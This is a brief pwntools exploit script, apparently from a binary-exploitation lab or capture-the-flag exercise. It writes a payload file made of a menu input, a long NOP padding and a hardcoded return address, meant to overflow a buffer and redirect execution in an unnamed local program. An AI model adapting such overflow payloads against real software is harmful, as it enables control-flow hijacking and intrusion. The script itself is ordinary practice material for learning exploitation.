#!/usr/bin/env python2

from pwn import *

context.arch='amd64'
context.os='linux'

# Return address in little-endian format
ret_addr = 0x555555555229
addr = p64(ret_addr, endian='little')

# Opcode for the NOP instruction
nop = asm('nop', arch="amd64")
# Writes payload on a file
payload = "2\n"+nop*1022+nop*167 + addr
with open("./shellcode_payload", "wb") as f:
	f.write(payload)
